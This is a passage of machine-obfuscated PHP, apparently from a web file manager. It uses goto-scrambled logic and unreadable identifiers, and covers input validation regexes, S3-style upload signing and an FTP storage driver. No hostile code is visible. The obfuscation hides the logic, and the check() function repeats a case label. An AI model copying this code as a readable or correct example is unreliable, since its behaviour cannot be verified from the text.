FéﬁÖãî‹∞; F¯≤áéÜ˜è: if ($d»µßâ–ê’) { return $d»µßâ–ê’; } if ($c÷¶í»Ω®± == $fÖ‰∑íƒÕΩ[804]) { $d»µßâ–ê’ = self::make(Model($fÖ‰∑íƒÕΩ[520])->systemRootPathAdd($fÖ‰∑íƒÕΩ[813])); } else { $d»µßâ–ê’ = self::systemPath($fÖ‰∑íƒÕΩ[804]); $Dí∞ëäÇÓ◊ = self::sourceID($d»µßâ–ê’); $d»µßâ–ê’ = self::make(Model($fÖ‰∑íƒÕΩ[520])->mkdir($Dí∞ëäÇÓ◊, $c÷¶í»Ω®±)); } Model($fÖ‰∑íƒÕΩ[812])->set($A¿ÿÖÙ•‰´, $d»µßâ–ê’); goto EÍ∏ÈÖ√≠á; FéﬁÖãî‹∞: $fÖ‰∑íƒÕΩ =& $_SERVER[∞„˜ƒÑºª]; $A¿ÿÖÙ•‰´ = $fÖ‰∑íƒÕΩ[811] . ucfirst($c÷¶í»Ω®±); $d»µßâ–ê’ = Model($fÖ‰∑íƒÕΩ[812])->get($A¿ÿÖÙ•‰´); goto F¯≤áéÜ˜è; EÍ∏ÈÖ√≠á: return $d»µßâ–ê’; goto bÃ∆ÏéŒÚ÷; bÃ∆ÏéŒÚ÷: } public static function systemFolder($aö¡‘ë”ΩÚ) { $a™ªíœ©‘Ê = IO_PATH_SYSTEM_SOURCE . $aö¡‘ë”ΩÚ; $dÌçïûÔ…¬ = Cache::get($a™ªíœ©‘Ê); if (!$dÌçïûÔ…¬) { $b—’≤÷ñˆ• = IO::infoFull($a™ªíœ©‘Ê); if (!$b—’≤÷ñˆ•) { $dÌçïûÔ…¬ = IO::mkdir($a™ªíœ©‘Ê, REPEAT_SKIP); } else { $dÌçïûÔ…¬ = $b—’≤÷ñˆ•[$_SERVER[∞„˜ƒÑºª][84]]; } Cache::set($a™ªíœ©‘Ê, $dÌçïûÔ…¬, 3600 * 10); } return $dÌçïûÔ…¬; } public static function defaultDriver() { return Model($_SERVER[∞„˜ƒÑºª][460])->defaultDriver(); } public static function defaultIO() { $f„Ü¯¬åπü =& $_SERVER[∞„˜ƒÑºª]; $Eé¢◊„ŒØ‡ = self::defaultDriver(); return $f„Ü¯¬åπü[814] . $Eé¢◊„ŒØ‡[$f„Ü¯¬åπü[366]] . $f„Ü¯¬åπü[802]; } public static function fileTypeList() { $EıÈ££èØ¥ =& $_SERVER[∞„˜ƒÑºª]; $E–Ú”Ç÷œ… = $GLOBALS[$EıÈ££èØ¥[6]][$EıÈ££èØ¥[815]]; foreach ($E–Ú”Ç÷œ… as $fÙÕµú’≈µ => $FØ¬çÀ´Ñ®) { $A …£∑ëÍ⁄ = $EıÈ££èØ¥[816] . $fÙÕµú’≈µ; $aÌûˆëé¿Ï = LNG($A …£∑ëÍ⁄); if ($A …£∑ëÍ⁄ != $aÌûˆëé¿Ï) { $E–Ú”Ç÷œ…[$fÙÕµú’≈µ][$EıÈ££èØ¥[28]] = $aÌûˆëé¿Ï; } } return $E–Ú”Ç÷œ…; } } goto b∑º’¨Ê∂∏; aÎÊ·äô‡‡: define($_SERVER[∞„˜ƒÑºª][1302], 5); define($_SERVER[∞„˜ƒÑºª][1303], 16); define($_SERVER[∞„˜ƒÑºª][1304], 32); goto A˜∑≈Ú—µé; E‡á”≠Ç®õ: if (!function_exists($_SERVER[∞„˜ƒÑºª][1234])) { define($_SERVER[∞„˜ƒÑºª][1235], 0); define($_SERVER[∞„˜ƒÑºª][1236], 1); define($_SERVER[∞„˜ƒÑºª][1237], 2); function imageflip($fıÓºÇ•—¥, $C√ …∞°›©) { switch ($C√ …∞°›©) { case IMG_FLIP_HORIZONTAL: $E…±ì‘÷∞‘ = imagesx($fıÓºÇ•—¥) - 1; $aóé⁄óª√¶ = $E…±ì‘÷∞‘ / 2; $cÂ»◊‡ëá¨ = imagesy($fıÓºÇ•—¥); $fÌ‰’Ω∞äå = imageistruecolor($fıÓºÇ•—¥) ? imagecreatetruecolor(1, $cÂ»◊‡ëá¨) : imagecreate(1, $cÂ»◊‡ëá¨); for ($Eâ„çıà¬˘ = 0; $Eâ„çıà¬˘ < $aóé⁄óª√¶; ++$Eâ„çıà¬˘) { imagecopy($fÌ‰’Ω∞äå, $fıÓºÇ•—¥, 0, 0, $Eâ„çıà¬˘, 0, 1, $cÂ»◊‡ëá¨); imagecopy($fıÓºÇ•—¥, $fıÓºÇ•—¥, $Eâ„çıà¬˘, 0, $E…±ì‘÷∞‘ - $Eâ„çıà¬˘, 0, 1, $cÂ»◊‡ëá¨); imagecopy($fıÓºÇ•—¥, $fÌ‰’Ω∞äå, $E…±ì‘÷∞‘ - $Eâ„çıà¬˘, 0, 0, 0, 1, $cÂ»◊‡ëá¨); } break; case IMG_FLIP_VERTICAL: $eëÖ®Ö‹®ª = imagesx($fıÓºÇ•—¥); $då·≥ÍÆ¿Ã = imagesy($fıÓºÇ•—¥) - 1; $a™ªÆùµÒ¯ = $då·≥ÍÆ¿Ã / 2; $fÌ‰’Ω∞äå = imageistruecolor($fıÓºÇ•—¥) ? imagecreatetruecolor($eëÖ®Ö‹®ª, 1) : imagecreate($eëÖ®Ö‹®ª, 1); for ($dÌôƒå‘ãá = 0; $dÌôƒå‘ãá < $a™ªÆùµÒ¯; ++$dÌôƒå‘ãá) { imagecopy($fÌ‰’Ω∞äå, $fıÓºÇ•—¥, 0, 0, 0, $dÌôƒå‘ãá, $eëÖ®Ö‹®ª, 1); imagecopy($fıÓºÇ•—¥, $fıÓºÇ•—¥, 0, $dÌôƒå‘ãá, 0, $då·≥ÍÆ¿Ã - $dÌôƒå‘ãá, $eëÖ®Ö‹®ª, 1); imagecopy($fıÓºÇ•—¥, $fÌ‰’Ω∞äå, 0, $då·≥ÍÆ¿Ã - $dÌôƒå‘ãá, 0, 0, $eëÖ®Ö‹®ª, 1); } break; case IMG_FLIP_BOTH: $eëÖ®Ö‹®ª = imagesx($fıÓºÇ•—¥); $cÂ»◊‡ëá¨ = imagesy($fıÓºÇ•—¥); $fÌ‰’Ω∞äå = imagerotate($fıÓºÇ•—¥, 180, 0); imagecopy($fıÓºÇ•—¥, $fÌ‰’Ω∞äå, 0, 0, 0, 0, $eëÖ®Ö‹®ª, $cÂ»◊‡ëá¨); break; default: return; } imagedestroy($fÌ‰’Ω∞äå); } } if (!function_exists($_SERVER[∞„˜ƒÑºª][1238])) { function imagecreatefrombmp($D¡§ê©ÉÒÁ) { return imageGdBMP::load($D¡§ê©ÉÒÁ); } } class Input { public static function getArray($féöæÙ˜õä) { goto Bé¥‡‚ô”Â; aß”Œ”˜‹ﬁ: $b©é¿⁄¨‡ı = array(); $c¶á¯Û¶ô = LNG($fƒùÌåû•Ñ[1239]); foreach ($féöæÙ˜õä as $DÜŒèÖâÇä => $CåÃ°µÜ‰ü) { goto D¯Ç∫ßñÛÏ; D¯Ç∫ßñÛÏ: $fÓòªØÿ‹¡ = _get($CåÃ°µÜ‰ü, $fƒùÌåû•Ñ[1240], $c¶á¯Û¶ô . $fƒùÌåû•Ñ[640] . $DÜŒèÖâÇä); $Cú§»àÆâ« = $DÜŒèÖâÇä; if (isset($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1241]]) && $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1241]]) { $Cú§»àÆâ« = $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1241]]; } goto bã›‚π ûÃ; bã›‚π ûÃ: if (!array_key_exists($DÜŒèÖâÇä, $in)) { if (array_key_exists($fƒùÌåû•Ñ[1242], $CåÃ°µÜ‰ü)) { if (!is_null($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1242]])) { $aã“Î§˘÷∆[$Cú§»àÆâ«] = $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1242]]; } } else { if (isset($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1243]])) { $b©é¿⁄¨‡ı[] = $fÓòªØÿ‹¡; } } continue; } if (isset($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1243]]) && $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1243]] == $fƒùÌåû•Ñ[281]) { $BÜ⁄ûæÑ∞Ü = json_decode($in[$DÜŒèÖâÇä], !0); if (is_array($BÜ⁄ûæÑ∞Ü)) { $aã“Î§˘÷∆[$Cú§»àÆâ«] = $BÜ⁄ûæÑ∞Ü; } else { if (array_key_exists($fƒùÌåû•Ñ[1242], $CåÃ°µÜ‰ü)) { if (!is_null($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1242]])) { $aã“Î§˘÷∆[$Cú§»àÆâ«] = $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1242]]; } } else { $b©é¿⁄¨‡ı[] = $fÓòªØÿ‹¡; } } continue; } $E ˆç—Â∞Ê = _get($CåÃ°µÜ‰ü, $fƒùÌåû•Ñ[745]); goto c⁄⁄áÁ•åÚ; c⁄⁄áÁ•åÚ: if (isset($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1243]]) && !self::check($in[$DÜŒèÖâÇä], $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1243]], $E ˆç—Â∞Ê)) { if (array_key_exists($fƒùÌåû•Ñ[1242], $CåÃ°µÜ‰ü)) { if (!is_null($CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1242]])) { $aã“Î§˘÷∆[$Cú§»àÆâ«] = $CåÃ°µÜ‰ü[$fƒùÌåû•Ñ[1242]]; } } else { $b©é¿⁄¨‡ı[] = $fÓòªØÿ‹¡; } continue; } $aã“Î§˘÷∆[$Cú§»àÆâ«] = $in[$DÜŒèÖâÇä]; goto FÓõÔåÈ–»; FÓõÔåÈ–»: } goto E‹ûà»ˆÉ‰; E‹ûà»ˆÉ‰: if (count($b©é¿⁄¨‡ı) > 0) { show_json(implode($fƒùÌåû•Ñ[1244], $b©é¿⁄¨‡ı), !1); } return $aã“Î§˘÷∆; goto fÆ¶®û∫ù; Bé¥‡‚ô”Â: $fƒùÌåû•Ñ =& $_SERVER[∞„˜ƒÑºª]; global $in; $aã“Î§˘÷∆ = array(); goto aß”Œ”˜‹ﬁ; fÆ¶®û∫ù: } public static function reg($e¢Ê≤Ó∞Û± = "\x72\x65\x71\165\x69\x72\145") { static $Cã¿ŒºÊçÊ = array("\162\145\x71\x75\x69\x72\145" => "\x2e\53", "\156\165\155\x62\x65\x72" => "\134\144\x2b", "\x68\x65\x78" => "\133\60\x2d\71\x41\x2d\x46\x61\x2d\x66\135\x2b", "\x69\156\x74" => "\133\x2d\x5c\x2b\x5d\77\x5c\144\53", "\142\157\x6f\x6c" => "\x30\174\x31", "\x66\154\157\x61\164" => "\x5b\x2d\x5c\53\x5d\x3f\134\144\53\x28\x5c\56\x5c\x64\x2b\51\77", "\x65\x6e\x67\x6c\151\x73\150" => "\x5b\x41\x2d\132\x61\x2d\172\40\x5d\53", "\143\150\151\x6e\145\x73\145" => "\x5b\134\170\x7b\64\145\x30\x30\x7d\x2d\x5c\x78\x7b\x39\146\141\x35\175\135\53", "\x68\x61\x73\x43\150\x69\156\145\x73\145" => "\x2f\50\133\134\x78\x7b\x34\145\x30\60\175\x2d\134\170\x7b\71\146\x61\65\175\135\53\x29\x2f\165", "\145\155\141\151\154" => "\134\x77\x2b\50\133\x5c\x2e\134\55\135\x5c\x77\x2b\x29\x2a\x5c\100\x5c\x77\x2b\x28\133\x5c\56\x5c\x2d\135\x5c\x77\x2b\51\x2a\x5c\x2e\x5c\x77\53", "\160\150\157\156\145" => "\61\x5b\63\64\x35\67\70\135\134\x64\173\71\x7d", "\x74\145\x6c\x70\x68\157\156\145" => "\x28\134\x28\x5c\x64\173\x33\54\x34\175\134\x29\174\134\144\173\63\x2c\x34\x7d\x2d\x7c\x5c\x73\51\x3f\134\144\x7b\x37\54\61\64\x7d", "\165\x72\x6c" => "\50\x68\x74\164\x70\174\146\164\x70\x7c\x68\164\x74\160\163\x29\x3a\134\x2f\x5c\57\133\134\167\x5c\55\x5f\135\x2b\50\x5c\x2e\x5b\x5c\167\x5c\55\x5f\135\53\51\x2b\50\133\134\167\x5c\x2d\134\56\x2c\x40\x3f\x5e\x3d\45\46\72\134\57\x7e\134\53\43\x5d\x2a\x5b\x5c\x77\134\55\x5c\100\77\136\75\45\x26\134\x2f\176\134\x2b\43\135\x29\77", "\x75\162\154\106\x75\154\x6c" => "\133\141\x2d\172\101\55\172\x5d\x2b\x3a\134\x2f\134\57\133\136\x5c\x73\135\x2a", "\151\x70" => "\x28\134\144\x7b\61\54\x33\175\x5c\x2e\x29\173\x33\x7d\x28\134\144\x7b\x31\x2c\63\175\51", "\x7a\x69\160" => "\x5b\61\55\x39\x5d\134\144\173\65\x7d\x28\x3f\x21\x5c\144\x29", "\x69\144\x43\x61\x72\144" => "\x28\134\x64\x7b\61\65\x7d\x29\174\x28\x5c\144\173\61\x37\x7d\x28\x5c\144\x7c\130\x7c\x78\51\51", "\x63\157\154\157\162" => "\x23\x28\x5b\x30\55\x39\101\55\x46\x61\55\146\135\x7b\63\175\174\133\x30\55\x39\101\x2d\106\x61\55\x66\135\173\66\175\x29", "\164\151\x6d\x65" => "\50\133\60\55\x31\135\134\144\x7c\x32\133\60\55\x34\135\51\x3a\x5b\60\x2d\x35\x5d\134\144", "\x64\141\164\x65" => "\x5c\144\173\64\175\x5b\x2d\x5c\x2f\135\x3f\50\x30\133\x31\55\71\135\x7c\61\133\60\x2d\x32\135\51\133\55\134\57\135\x3f\x28\x5b\60\55\62\x5d\x5c\x64\174\63\x5b\x30\55\61\135\51", "\x64\x61\x74\145\x54\151\155\x65" => "\x5c\x64\x7b\64\x7d\x5b\x2d\x5c\x2f\x5d\x3f\50\60\x5b\61\x2d\x39\135\174\x31\x5b\x30\55\62\135\x29\x5b\x2d\134\x2f\135\77\x28\x5b\60\55\62\135\x5c\x64\x7c\x33\x5b\x30\x2d\61\135\51\x5c\163\53\50\133\60\x2d\61\135\x5c\144\x7c\x32\133\x30\x2d\x34\x5d\x29\x3a\133\60\55\65\135\134\144", "\x70\x61\x73\163\167\157\162\x64" => "\50\x3f\x3d\56\x2a\134\x64\51\50\77\75\x2e\x2a\x5b\x61\55\x7a\135\51\x28\x3f\75\56\x2a\133\101\55\132\135\51\56\x7b\70\54\x32\x30\175", "\153\x65\x79" => "\133\x41\55\132\141\55\x7a\x30\x2d\x39\x5f\x5c\55\134\x2e\135\53", "\153\145\x79\x46\x75\154\154" => "\x5b\x41\x2d\x5a\141\55\x7a\60\55\x39\x5f\x5c\55\x5c\56\x5c\163\x2c\135\53"); if (!$e¢Ê≤Ó∞Û±) { return $Cã¿ŒºÊçÊ; } return $Cã¿ŒºÊçÊ[$e¢Ê≤Ó∞Û±]; } public static function check($C≈‚ñ∫÷üÉ, $AıÛø„å¡Ø, $d•µ ØÕ¥¬ = null) { $bÂÖ»ÛÖç¥ =& $_SERVER[∞„˜ƒÑºª]; switch ($AıÛø„å¡Ø) { case $bÂÖ»ÛÖç¥[7]: return in_array($C≈‚ñ∫÷üÉ, $d•µ ØÕ¥¬); break; case $bÂÖ»ÛÖç¥[1245]: return floatval($C≈‚ñ∫÷üÉ) > $d•µ ØÕ¥¬; break; case $bÂÖ»ÛÖç¥[1246]: return floatval($C≈‚ñ∫÷üÉ) < $d•µ ØÕ¥¬; break; case $bÂÖ»ÛÖç¥[324]: return strlen($C≈‚ñ∫÷üÉ) >= $d•µ ØÕ¥¬[0] && strlen($C≈‚ñ∫÷üÉ) <= $d•µ ØÕ¥¬[1]; break; case $bÂÖ»ÛÖç¥[324]: if (is_array($d•µ ØÕ¥¬)) { return strlen($C≈‚ñ∫÷üÉ) >= $d•µ ØÕ¥¬[0] && strlen($C≈‚ñ∫÷üÉ) <= $d•µ ØÕ¥¬[1]; break; } else { return strlen($C≈‚ñ∫÷üÉ) == $d•µ ØÕ¥¬; break; } case $bÂÖ»ÛÖç¥[320]: return floatval($C≈‚ñ∫÷üÉ) >= $d•µ ØÕ¥¬[0] && floatval($C≈‚ñ∫÷üÉ) <= $d•µ ØÕ¥¬[1]; break; } $aΩ§åÕù”∞ = self::reg(!1); $AıÛø„å¡Ø = isset($aΩ§åÕù”∞[$AıÛø„å¡Ø]) ? $aΩ§åÕù”∞[$AıÛø„å¡Ø] : $AıÛø„å¡Ø; if (substr($AıÛø„å¡Ø, 0, 1) != $bÂÖ»ÛÖç¥[8]) { $AıÛø„å¡Ø = $bÂÖ»ÛÖç¥[1247] . $AıÛø„å¡Ø . $bÂÖ»ÛÖç¥[1248]; } return preg_match($AıÛø„å¡Ø, $C≈‚ñ∫÷üÉ) === 1; } public static function get($Fü∞∆ÒÂâﬁ, $d„ÏÇâ…çÛ = null, $b∂´´Û°áÕ = null, $d¿∞á–Ñ“ﬂ = null) { goto CÚ‚œÔπŸâ; cò‡∑°°°Ÿ: if (!is_null($d¿∞á–Ñ“ﬂ)) { $Bºƒ†âÜ¡ƒ[$fß∫øÇŸÎÜ[745]] = $d¿∞á–Ñ“ﬂ; } if (!is_null($d„ÏÇâ…çÛ)) { $Bºƒ†âÜ¡ƒ[$fß∫øÇŸÎÜ[1243]] = $d„ÏÇâ…çÛ; } $bØà”Õ◊™¯ = Input::getArray(array($Fü∞∆ÒÂâﬁ => $Bºƒ†âÜ¡ƒ)); goto bËØ¢∆«Éù; CÚ‚œÔπŸâ: $fß∫øÇŸÎÜ =& $_SERVER[∞„˜ƒÑºª]; $Bºƒ†âÜ¡ƒ = array(); if (!is_null($b∂´´Û°áÕ)) { $Bºƒ†âÜ¡ƒ[$fß∫øÇŸÎÜ[34]] = $b∂´´Û°áÕ; } goto cò‡∑°°°Ÿ; bËØ¢∆«Éù: return $bØà”Õ◊™¯[$Fü∞∆ÒÂâﬁ]; goto FÚ≤¿™ ç¿; FÚ≤¿™ ç¿: } } goto Aáá∑öôä√; e«ı¢Ωï◊Ï: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($fÿ∏Á‹…ª´) { parent::__construct($fÿ∏Á‹…ª´); $this->signatureVersion($_SERVER[∞„˜ƒÑºª][196]); } public function uploadFormData($f§≈´∫‡ÓÕ, $b∞≈öÈÑ¯ = 3600) { goto Eëç¿ñòπî; AıçÜ®§á·: $aÿê√ÊåõÓ = array($this->accessKey, $açÆö∞ÊÙ‚, $this->region, $b´Ü⁄Â¿ê¡, $C∑¥™¯£Àç); $c§’èÖúê≤ = implode($dè°éà…›[8], $aÿê√ÊåõÓ); $eÑ“Ó∂œË∏ = array($dè°éà…›[819] => gmdate($dè°éà…›[818], strtotime($dè°éà…›[843])), $dè°éà…›[820] => array(array($dè°éà…›[822] => $this->bucket), array($dè°éà…›[821] => $eµ°£ûè∫ÿ), array($dè°éà…›[823], $dè°éà…›[824], $dè°éà…›[33]), array($dè°éà…›[823], $dè°éà…›[844], $dè°éà…›[33]), array($dè°éà…›[823], $dè°éà…›[845], $dè°éà…›[33]), array($dè°éà…›[825] => $cÉßÿì∏íã), array($dè°éà…›[846] => $c§’èÖúê≤), array($dè°éà…›[847] => $b™‡âé·¢¯), array($dè°éà…›[848] => $eÇöÿÖÛíö), array($dè°éà…›[849] => $e≈‹ÁÈÏÏî))); goto b∏◊éë—‰; Eëç¿ñòπî: $dè°éà…› =& $_SERVER[∞„˜ƒÑºª]; $eµ°£ûè∫ÿ = $dè°éà…›[181]; $b™‡âé·¢¯ = $dè°éà…›[840]; goto aÕã±Îäê ; aÕã±Îäê : $b´Ü⁄Â¿ê¡ = $dè°éà…›[67]; $eÇöÿÖÛíö = gmdate($dè°éà…›[841]); $açÆö∞ÊÙ‚ = gmdate($dè°éà…›[446]); goto f„ÛìÃ∆Ë§; b∏◊éë—‰: $eî„Àµë‹Ø = base64_encode(json_encode($eÑ“Ó∂œË∏)); $c¿ÌÁîÂì∂ = hash_hmac($dè°éà…›[850], $açÆö∞ÊÙ‚, $dè°éà…›[851] . $this->secret, !0); $FùóÆ€å ï = hash_hmac($dè°éà…›[850], $this->region, $c¿ÌÁîÂì∂, !0); goto f‡ºÚõ’ÌÚ; Fõàó…ö⁄¥: $BÛ´´á”ò = array($dè°éà…›[195] => $dè°éà…›[33], $dè°éà…›[852] => $dè°éà…›[33], $dè°éà…›[821] => $eµ°£ûè∫ÿ, $dè°éà…›[825] => $cÉßÿì∏íã, $dè°éà…›[829] => $eî„Àµë‹Ø, $dè°éà…›[853] => $c§’èÖúê≤, $dè°éà…›[854] => $b™‡âé·¢¯, $dè°éà…›[855] => $eÇöÿÖÛíö, $dè°éà…›[856] => $e≈‹ÁÈÏÏî, $dè°éà…›[857] => $f›üÑã¬Æ, $dè°éà…›[165] => $this->getHost()); return $BÛ´´á”ò; goto BÆ™≥öùéá; f„ÛìÃ∆Ë§: $C∑¥™¯£Àç = $dè°éà…›[842]; $e≈‹ÁÈÏÏî = $b∞≈öÈÑ¯ . $dè°éà…›[33]; $cÉßÿì∏íã = $dè°éà…›[817]; goto AıçÜ®§á·; f‡ºÚõ’ÌÚ: $b∫Í∑∆ßÒé = hash_hmac($dè°éà…›[850], $b´Ü⁄Â¿ê¡, $FùóÆ€å ï, !0); $f◊…≥Õ—ˆÖ = hash_hmac($dè°éà…›[850], $C∑¥™¯£Àç, $b∫Í∑∆ßÒé, !0); $f›üÑã¬Æ = hash_hmac($dè°éà…›[850], $eî„Àµë‹Ø, $f◊…≥Õ—ˆÖ); goto Fõàó…ö⁄¥; BÆ™≥öùéá: } public function fileOutLink($fÁª‘˜Ñ‚‹) { header($_SERVER[∞„˜ƒÑºª][154] . $fÁª‘˜Ñ‚‹); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $port = 21; private $scheme = ''; private $connect = FALSE; public function __construct($Fπ£ã˜ò≈”) { parent::__construct(); if (count($Fπ£ã˜ò≈”) > 0) { $this->_init($Fπ£ã˜ò≈”); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function resetCharset($e√ÿ¥ñé”—) { $F°´í„‹Ÿ¢ =& $_SERVER[∞„˜ƒÑºª]; global $config; $this->appCharset = $config[$F°´í„‹Ÿ¢[858]]; $this->systemCharset = $config[$F°´í„‹Ÿ¢[859]]; if (isset($e√ÿ¥ñé”—[$F°´í„‹Ÿ¢[860]]) && $e√ÿ¥ñé”—[$F°´í„‹Ÿ¢[860]]) { $this->systemCharset = $e√ÿ¥ñé”—[$F°´í„‹Ÿ¢[860]]; } } public function iconvApp($AæÂñ´–¶Ø) { return $this->iconvTo($AæÂñ´–¶Ø, $this->systemCharset, $this->appCharset); } public function iconvSystem($bò≈òåàÿ∫) { return $this->iconvTo($bò≈òåàÿ∫, $this->appCharset, $this->systemCharset); } public function getPathOuter($aŒã±è…Ï›) { goto f‹∆ëÍ¬‹‹; f‹∆ëÍ¬‹‹: $Bœ‚Çü÷ŒÑ =& $_SERVER[∞„˜ƒÑºª]; $E€ô¶ÑîÀÑ = $this->iconvApp($this->pathBase); $aŒã±è…Ï› = $this->iconvApp($aŒã±è…Ï›); goto A¬õñê€‘∞; A¬õñê€‘∞: if (substr($E€ô¶ÑîÀÑ, 0, 2) == $Bœ‚Çü÷ŒÑ[861]) { $E€ô¶ÑîÀÑ = BASIC_PATH . substr($E€ô¶ÑîÀÑ, 2); } if (substr($aŒã±è…Ï›, 0, 2) == $Bœ‚Çü÷ŒÑ[861]) { $aŒã±è…Ï› = BASIC_PATH . substr($aŒã±è…Ï›, 2); } $E€ô¶ÑîÀÑ = KodIO::clear($E€ô¶ÑîÀÑ); goto B“÷Ë≈ç∂á; B“÷Ë≈ç∂á: $aŒã±è…Ï› = KodIO::clear($aŒã±è…Ï›); $aŒã±è…Ï› = substr($aŒã±è…Ï›, strlen($E€ô¶ÑîÀÑ)); if (empty($this->pathDriver)) { return $aŒã±è…Ï›; } goto cÍ¨ä≠€è; cÍ¨ä≠€è: return $this->pathDriver . $Bœ‚Çü÷ŒÑ[8] . ltrim($aŒã±è…Ï›, $Bœ‚Çü÷ŒÑ[8]); goto dÎΩ‚ÎÍ‰‡; dÎΩ‚ÎÍ‰‡: } private function _init($eµ™›åÜ÷Â = array()) { goto e∫É¡ÚÖˆ»; A¥œ¯ƒ∑“Æ: $this->scheme = $bëΩ¢¢»Ò… ? $F⁄ŸòÓı·∑[866] : $F⁄ŸòÓı·∑[867]; $this->server = preg_replace($F⁄ŸòÓı·∑[868], $F⁄ŸòÓı·∑[33], $this->server); $this->connect = @ftp_connect($this->server, $this->port, 5); goto C◊©Ò¥ù»í; e’√¢∫Ω‚§: return $FÏõÓ‘âÛå; goto eº·◊åÿç«; C◊©Ò¥ù»í: if ($this->connect === !1) { return; } $FÏõÓ‘âÛå = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_pasv($this->connect, !0); goto e’√¢∫Ω‚§; e∫É¡ÚÖˆ»: $F⁄ŸòÓı·∑ =& $_SERVER[∞„˜ƒÑºª]; if (!function_exists($F⁄ŸòÓı·∑[862])) { show_json(LNG($F⁄ŸòÓı·∑[863]), !1); } $this->resetCharset($eµ™›åÜ÷Â); goto aíÇò¶¶≠£; aíÇò¶¶≠£: foreach ($eµ™›åÜ÷Â as $DÆÎâÂ›ùì => $cçΩ¨÷ëÉË) { if (isset($this->{$DÆÎâÂ›ùì})) { $this->{$DÆÎâÂ›ùì} = $cçΩ¨÷ëÉË; } } $DÛ®‡‚Á—È = explode($F⁄ŸòÓı·∑[864], $this->server); $bëΩ¢¢»Ò… = strtolower(trim($DÛ®‡‚Á—È[0])) == $F⁄ŸòÓı·∑[865] ? !0 : !1; goto A¥œ¯ƒ∑“Æ; eº·◊åÿç«: } private function _isconn() { return is_resource($this->connect); } public function mkfile($F¶ÖÜõ‡ìß, $d ∆¡ﬁ¢∑… = '', $cÃÑŒª√Ô≥ = REPEAT_RENAME) { goto A¢®àï…∆ç; BñÇñÃ©£›: $F¶ÖÜõ‡ìß = $this->iconvSystem($F¶ÖÜõ‡ìß); $F£Âß ä¶Ú = $this->tempFile($this->pathThis($F¶ÖÜõ‡ìß)); if ($d ∆¡ﬁ¢∑…) { file_put_contents($F£Âß ä¶Ú, $d ∆¡ﬁ¢∑…); } goto b¿ÚÑ¢çû; A¢®àï…∆ç: if (!$this->_isconn()) { return !1; } $CÜ®Úå¿Õø = $this->pathFather($F¶ÖÜõ‡ìß); if (!$this->isFolder($CÜ®Úå¿Õø) && !$this->mkdir($CÜ®Úå¿Õø)) { return !1; } goto BñÇñÃ©£›; b¿ÚÑ¢çû: $Fœ‘§üè§„ = $this->upload($this->iconvApp($F¶ÖÜõ‡ìß), $this->iconvApp($F£Âß ä¶Ú)); $this->tempFileRemve($F£Âß ä¶Ú); return $Fœ‘§üè§„ ? $this->getPathOuter($F¶ÖÜõ‡ìß) : !1; goto fº„—ø≠ıá; fº„—ø≠ıá: } public function mkdir($DìÆ’…Óﬁ≤, $bŸ§£í¨≥„ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $DìÆ’…Óﬁ≤ = $this->iconvSystem($DìÆ’…Óﬁ≤); if ($this->isFolder($DìÆ’…Óﬁ≤) || @ftp_mkdir($this->connect, $DìÆ’…Óﬁ≤)) { return $this->getPathOuter($DìÆ’…Óﬁ≤); } if (!$this->mkdir($this->pathFather($DìÆ’…Óﬁ≤))) { return !1; } if ($DìÆ’…Óﬁ≤ = @ftp_mkdir($this->connect, $DìÆ’…Óﬁ≤)) { return $this->getPathOuter($DìÆ’…Óﬁ≤); } return !1; } public function copyFile($c¨∆ä‡Âûñ, $AÏàïå†•õ) { goto dˆõÂÉÔåŒ; dˆõÂÉÔåŒ: if (!$this->_isconn()) { return !1; } $Aº•ÙŸÔ¯¡ = $this->pathThis($this->iconvSystem($c¨∆ä‡Âûñ)); $EÃñ‹Ç¥äÈ = $this->tempFile($Aº•ÙŸÔ¯¡); goto a∫´≤ÃóÖ∑; a∫´≤ÃóÖ∑: $f¶â„â‘∏– = $this->iconvApp($EÃñ‹Ç¥äÈ); $this->download($c¨∆ä‡Âûñ, $f¶â„â‘∏–); $b‚∏ﬁ¢≈Æà = $this->upload($AÏàïå†•õ, $f¶â„â‘∏–); goto Fé√‰ÁêÇä; Fé√‰ÁêÇä: $this->tempFileRemve($EÃñ‹Ç¥äÈ); return $b‚∏ﬁ¢≈Æà; goto bﬁ‡“ÿà€µ; bﬁ‡“ÿà€µ: } public function moveFile($A™ûﬂì¬√Ã, $B‘”øåÌ—â) { if (!$this->_isconn()) { return !1; } $A™ûﬂì¬√Ã = $this->iconvSystem($A™ûﬂì¬√Ã); $B‘”øåÌ—â = $this->iconvSystem($B‘”øåÌ—â); $Fë®∫ì‚Ö≠ = @ftp_rename($this->connect, $A™ûﬂì¬√Ã, $B‘”øåÌ—â); return $Fë®∫ì‚Ö≠ ? $this->getPathOuter($B‘”øåÌ—â) : !1; } public function delFile($bÂ°’ë°Ÿè) { if (!$this->_isconn()) { return !1; } $bÂ°’ë°Ÿè = $this->iconvSystem($bÂ°’ë°Ÿè); return @ftp_delete($this->connect, $bÂ°’ë°Ÿè); } public function delFolder($dåàè∞∞ËÑ) { if (!$this->_isconn()) { return !1; } $dåàè∞∞ËÑ = $this->iconvSystem($dåàè∞∞ËÑ); $eóªÌøÇÀÑ = $this->ftpList($dåàè∞∞ËÑ); if (!$eóªÌøÇÀÑ) { return @ftp_rmdir($this->connect, $dåàè∞∞ËÑ); } foreach ($eóªÌøÇÀÑ as $DÁÔﬁÁÂÀ∞) { if ($this->_isFolder($DÁÔﬁÁÂÀ∞)) { $DÁÔﬁÁÂÀ∞ = $this->iconvApp($DÁÔﬁÁÂÀ∞); $this->delFolder($DÁÔﬁÁÂÀ∞); } else { @ftp_delete($this->connect, 